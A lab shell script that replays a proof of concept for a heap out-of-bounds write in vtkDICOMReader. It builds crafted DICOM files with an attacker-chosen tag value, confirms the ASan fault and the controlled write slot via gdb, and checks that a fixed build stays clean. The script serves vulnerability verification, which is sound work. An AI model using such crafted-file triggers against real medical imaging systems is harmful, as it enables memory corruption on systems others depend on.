#!/bin/sh
# One-command replay of the crafted-file -> real vtkDICOMReader heap OOB.
# Requires the W1 lab-local builds (build-asan, build-fixed) and deps/root.
set -eu
cd "$(dirname "$0")/.."
export LD_LIBRARY_PATH="$PWD/deps/root/usr/lib/x86_64-linux-gnu"
python3 tools/make-undef-ob-dos.py evidence/undef-ob-dos.dcm
python3 tools/make-undef-ob-dos.py evidence/undef-ob-chosen.dcm 4841434b
export ASAN_OPTIONS=detect_leaks=0

echo "== vulnerable reader, chosen tag =="
if ./build-asan/bin/reader-probe evidence/undef-ob-chosen.dcm > evidence/asan-file-reader-chosen.out 2>&1; then
  echo "FAIL: vulnerable reader did not fault"; exit 1
fi
grep -q 'heap-buffer-overflow' evidence/asan-file-reader-chosen.out
grep -q 'WRITE of size 4' evidence/asan-file-reader-chosen.out
grep -q '32 bytes after 136-byte region' evidence/asan-file-reader-chosen.out
grep -q 'vtkDICOMItem.cxx:195' evidence/asan-file-reader-chosen.out
echo "PASS: vulnerable reader ASan OOB"

echo "== fixed reader, same bytes =="
./build-fixed/bin/reader-probe-fixed evidence/undef-ob-chosen.dcm > evidence/asan-file-reader-fixed-chosen.out 2>&1
grep -q 'reader Update completed' evidence/asan-file-reader-fixed-chosen.out
! grep -q 'AddressSanitizer' evidence/asan-file-reader-fixed-chosen.out
echo "PASS: fixed reader clean"

echo "== safe input control =="
./build-asan/bin/reader-probe evidence/corpus/a-exp-US-0.dcm > evidence/asan-file-safe.out 2>&1
grep -q 'reader Update completed' evidence/asan-file-safe.out
! grep -q 'AddressSanitizer' evidence/asan-file-safe.out
echo "PASS: safe input clean"

echo "== gdb chosen-byte slot on plain build =="
gdb -q -batch -x tools/chosen.gdb ./build-vuln/bin/dicomdump > evidence/gdb-file-chosen.out 2>&1
grep -q 'OOBWRITE tag=4841,434b key=4841434b n=5' evidence/gdb-file-chosen.out
grep -q 'slot=5' evidence/gdb-file-chosen.out
echo "PASS: chosen key written at slot 5"
echo "REPLAY_FILE_PATH_OK"
